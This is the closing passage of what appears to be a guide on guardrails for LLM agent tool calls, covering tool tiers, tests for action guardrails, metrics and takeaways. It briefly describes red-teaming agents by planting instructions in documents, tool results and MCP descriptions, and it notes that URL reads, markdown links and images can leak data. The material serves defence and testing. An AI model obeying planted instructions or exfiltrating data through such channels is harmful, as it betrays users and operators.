| `delete_ticket` | T3 | `admin` | Single ID, not in `legal_hold` | **Always**, second approver | 1 call | Separate credential with `tickets:delete` | None |

Global budgets: max 20 agent steps, max 30 tool calls, max cost per run set to 3× p99, and loop detection enabled.

---

## 15. Evaluating tool and action guardrails

Test action guardrails like deterministic application code first, then test them adversarially. See [agent tool & trajectory evals](../02-offline-evals/04-agent-tool-and-trajectory-evals.md) for agent quality evaluation.

| Test type | What to check | Ground truth |
|---|---|---|
| Unit tests on the gate | Verify that each `(role, tool)` pair returns the expected allow/deny and that invalid arguments fail | Policy table |
| SQL guard corpus | Run a labeled set of safe and unsafe queries (DDL, DML, multi-statement, forbidden tables, dangerous functions, dialect quirks) | Expected verdict per query |
| Budget tests | Run scripted agents that loop or fan out and assert that they stop at the configured limit | Budget config |
| Approval tests | Assert that T3 calls never execute without an approval record bound to the exact payload hash | Audit log |
| Injection red team | Plant instructions in documents, tool results, and MCP descriptions, and count attempted vs executed T2/T3 calls | 0 unapproved executions |
| Trajectory evals | Confirm that the agent selects the right tool with valid arguments on benign tasks without false blocks | Golden trajectories |

Track five operational metrics:

- **Unsafe action execution rate**: target **0** (any non-zero value is a security incident).
- **Unsafe action attempt rate**: count how often the model *attempts* a blocked call. Rising attempts signal a prompt regression or active attack.
- **False block rate**: measure legitimate tasks blocked by overly strict rules.
- **Approval rate and time-to-approve**: monitor for rubber-stamping.
- **Budget breach rate**: break down breaches by cause (loops, cost, timeouts).

---

## Key takeaways

- **Route every tool call through one deterministic gate.** Enforce allowlists, argument validation, budgets, approvals, scoped credentials, and audit logging in code.
- **Tier tools by worst-case impact (read, write, external, destructive).** Attach controls to the tier, and remember that URL reads can exfiltrate data.
- **Inject identity, tenant, and permission parameters from the authenticated session.** Never let the model supply them.
- **Make human approvals meaningful.** Show clear dry-run previews, bind approvals to payload hashes, and keep prompt frequency low.
- **Bound steps, tool calls, tokens, cost, time, and rows.** Run loop detection on every agent trajectory.
- **Sandbox code execution with zero credentials and no network by default.** Police every egress channel, including markdown links and images.
- **Enforce text-to-SQL security in the database first.** Combine a read-only role, RLS, and timeouts with a `sqlglot` AST guard and `EXPLAIN` limits.
- **Treat MCP servers, tool descriptions, and tool outputs as untrusted.** Pin manifests, allowlist tools per agent, and enforce your gate in front of every call.

## Further reading

- [MCP specification — Tools (security considerations)](https://modelcontextprotocol.io/specification/2025-06-18/server/tools)
- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices)
- [MCP Authorization](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)
- [Invariant Labs — MCP tool poisoning attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [OWASP LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/)
- [OWASP LLM10:2025 Unbounded Consumption](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/)
- [Simon Willison — The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Debenedetti et al. — Defeating Prompt Injections by Design (CaMeL)](https://arxiv.org/abs/2503.18813)
- [sqlglot](https://github.com/tobymao/sqlglot)
- [PostgreSQL — Row Security Policies](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)
- Within this repo: [Threat model & OWASP](./07-threat-model-owasp.md) · [Access control & RBAC](./06-access-control-rbac.md) · [Guardrail selection decision tree](../05-decision-framework/02-guardrail-selection-decision-tree.md) · [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)
